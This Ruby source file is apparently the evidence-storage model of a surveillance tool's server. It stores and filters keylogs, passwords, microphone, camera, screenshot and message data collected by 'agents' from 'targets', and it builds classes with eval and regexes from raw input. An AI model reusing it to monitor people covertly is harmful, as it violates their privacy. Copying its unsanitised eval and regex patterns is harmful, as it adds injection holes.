require 'mongoid'
require_relative '../shard'

require 'rcs-common/keywords'

#module RCS
#module DB

class Evidence
  extend RCS::Tracer

  TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
           "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    class_definition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :da, type: Integer                      # date acquired
        field :dr, type: Integer                      # date received
        field :type, type: String
        field :rel, type: Integer, default: 0         # relevance (tag)
        field :blo, type: Boolean, default: false     # blotter (report)
        field :note, type: String
        field :aid, type: String                      # agent BSON_ID
        field :data, type: Hash
        field :kw, type: Array, default: []           # keywords for full text search

        store_in collection: Evidence.collection_name('#{target}')

        after_create :create_callback
        before_destroy :destroy_callback

        index({type: 1}, {background: true})
        index({da: 1}, {background: true})
        index({dr: 1}, {background: true})
        index({aid: 1}, {background: true})
        index({rel: 1}, {background: true})
        index({blo: 1}, {background: true})
        index({kw: 1}, {background: true})

        shard_key :type, :da, :aid

        STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']

        def self.create_collection
          # create the collection for the target's evidence and shard it
          db = RCS::DB::DB.instance.mongo_connection
          collection = db.collection(Evidence.collection_name('#{target}'))
          # ensure indexes
          self.create_indexes
          # enable sharding only if not enabled
          RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
        end

        protected

        def create_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] += 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] += 1
          agent.stat.size += self.data.to_s.length
          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          # update the target of this agent
          agent.get_parent.restat
        end

        def destroy_callback
          agent = Item.find self.aid
          # drop the file (if any) in grid
          unless self.data['_grid'].nil?
            RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) rescue nil
          end
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval class_definition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(target_id)
    klass = self.collection_class(target_id)
    return klass.new
  end

  def self.deep_copy(src, dst)
    dst.da = src.da
    dst.dr = src.dr
    dst.aid = src.aid.dup
    dst.type = src.type.dup
    dst.rel = src.rel
    dst.blo = src.blo
    dst.data = src.data.dup
    dst.note = src.note.dup unless src.note.nil?
    dst.kw = src.kw.dup unless src.kw.nil?
  end

  def self.report_filter(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    query = filtering.where(filter_hash).order_by([[:da, :asc]])

    return query
  end

  def self.report_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end


  def self.filtered_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info', 'command', 'ip'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end

  def self.common_filter(params)

    # filtering
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter' and params['filter'].is_a? String
    # must duplicate here since we delete the param later but we need to keep the parameter intact for
    # subsequent calls
    filter = params['filter'].dup if params.has_key? 'filter' and params['filter'].is_a? Hash

    # if not specified the filter on the date is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil? or filter['from'] == '24h'
    filter['from'] = Time.now.to_i - 7*86400 if filter['from'] == 'week'
    filter['from'] = Time.now.to_i - 30*86400 if filter['from'] == 'month'
    filter['from'] = Time.now.to_i if filter['from'] == 'now'

    filter['to'] = Time.now.to_i if filter['to'].nil?

    # to remove a filter set it to 0
    filter.delete('from') if filter['from'] == 0
    filter.delete('to') if filter['to'] == 0

    filter_hash = {}

    # filter by target
    target = Item.where({_id: filter.delete('target')}).first
    return nil if target.nil?

    # filter by agent
    filter_hash[:aid] = filter.delete('agent') if filter['agent']

    # default filter is on acquired
    date = filter.delete('date')
    date ||= 'da'
    date = date.to_sym

    # date filters must be treated separately
    filter_hash[date.gte] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'

    # custom filters for info
    parse_info_keywords(filter, filter_hash) if filter.has_key? 'info'

    #filter on note
    if filter['note']
      note = filter.delete('note')
      filter_hash[:note] = Regexp.new("#{note}", Regexp::IGNORECASE)
      filter_hash[:kw.all] = note.keywords
    end

    return filter, filter_hash, target
  end

  def self.parse_info_keywords(filter, filter_hash)

    info = filter.delete('info')

    # check if it's in the form of specific field name:
    #   field1:value1,field2:value2,etc,etc
    #
    if /[[:alpha:]]:[[:alpha:]]/ =~ info
      key_values = info.split(',')
      key_values.each do |kv|
        k, v = kv.split(':')
        k.downcase!

        # special case for email (the field is called "rcpt" but presented as "to")
        k = 'rcpt' if k == 'to'

        filter_hash["data.#{k}"] = Regexp.new("#{v}", Regexp::IGNORECASE)
        # add the keyword search to cut the nscanned item
        filter_hash[:kw.all] ||= v.keywords
      end
    else
      # otherwise we use it for full text search with keywords
      if info.include? '|'
        groups_of_words = info.split('|').map { |part| part.strip.keywords }
        filter_hash['$or'] = groups_of_words.map { |words| {'kw' => {'$all' => words}} }
      else
        # the search matches if all the keywords are matched inside the evidence
        filter_hash[:kw.all] = info.keywords
      end

    end
  rescue Exception => e
    trace :error, "Invalid filter for data [#{e.message}], ignoring..."
  end

  def self.offload_move_evidence(params)
    old_target = ::Item.find(params[:old_target_id])
    target = ::Item.find(params[:target_id])
    agent = ::Item.find(params[:agent_id])

    # moving an agent implies that all the evidence are moved to another target
    # we have to remove all the aggregates created from those evidence on the old target
    Aggregate.collection_class(old_target[:_id]).destroy_all(aid: agent[:_id].to_s)

    evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id])

    total = evidences.count
    chunk_size = 500
    trace :info, "Evidence Move: #{total} to be moved for agent #{agent.name} to target #{target.name}"

    # move the evidence in chunks to prevent cursor expiration on mongodb
    until evidences.count == 0 do

      evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id]).limit(chunk_size)

      # copy the new evidence
      evidences.each do |old_ev|
        # deep copy the evidence from one collection to the other
        new_ev = Evidence.dynamic_new(target[:_id])
        Evidence.deep_copy(old_ev, new_ev)

        # move the binary content
        if old_ev.data['_grid']
          begin
            bin = RCS::DB::GridFS.get(old_ev.data['_grid'], old_target[:_id].to_s)
            new_ev.data['_grid'] = RCS::DB::GridFS.put(bin, {filename: agent[:_id].to_s}, target[:_id].to_s) unless bin.nil?
            new_ev.data['_grid_size'] = old_ev.data['_grid_size']
          rescue Exception => e
            trace :error, "Cannot get id #{old_target[:_id].to_s}:#{old_ev.data['_grid']} from grid: #{e.class} #{e.message}"
          end
        end

        # save the new one
        new_ev.save

        # add to the aggregator queue the evidence (we need to recalculate them in the new target)
        if LicenseManager.instance.check :correlation
          AggregatorQueue.add(target[:_id], new_ev._id, new_ev.type)
        end

        # delete the old one. NOTE CAREFULLY:
        # we use delete + explicit grid, since the callback in the destroy will fail
        # because the parent of aid in the evidence is already the new one
        old_ev.delete
        RCS::DB::GridFS.delete(old_ev.data['_grid'], old_target[:_id].to_s) unless old_ev.data['_grid'].nil?

        # yield for progress indication
        yield if block_given?
      end

      total = total - chunk_size
      trace :info, "Evidence Move: #{total} left to move for agent #{agent.name} to target #{target.name}" unless total < 0
    end

    # we moved aggregates, have to rebuild the summary
    if LicenseManager.instance.check :correlation
      Aggregate.collection_class(old_target[:_id]).rebuild_summary
    end

    trace :info, "Evidence Move: completed for #{agent.name}"
  end


  def self.offload_delete_evidence(params)

    conditions = {}

    target = ::Item.find(params['target'])

    if params['agent']
      agent = ::Item.find(params['agent'])
      conditions[:aid] = agent._id.to_s
    end

    conditions[:rel] = params['rel']

    date = params['date']
    date ||= 'da'
    date = date.to_sym
    conditions[date.gte] = params['from']
    conditions[date.lte] = params['to']

    trace :info, "Deleting evidence for target #{target.name} #{params}"

    Evidence.collection_class(target._id.to_s).where(conditions).any_in(:rel => params['rel']).destroy_all

    trace :info, "Deleting evidence for target #{target.name} done."

    # recalculate the stats for each agent of this target
    agents = Item.where(_kind: 'agent').in(path: [target._id])
    agents.each do |a|
      ::Evidence::TYPES.each do |type|
        count = Evidence.collection_class(target[:_id]).where({aid: a._id.to_s, type: type}).count
        a.stat.evidence[type] = count
      end
      a.save
    end
  end

end

#end # ::DB
#end # ::RCS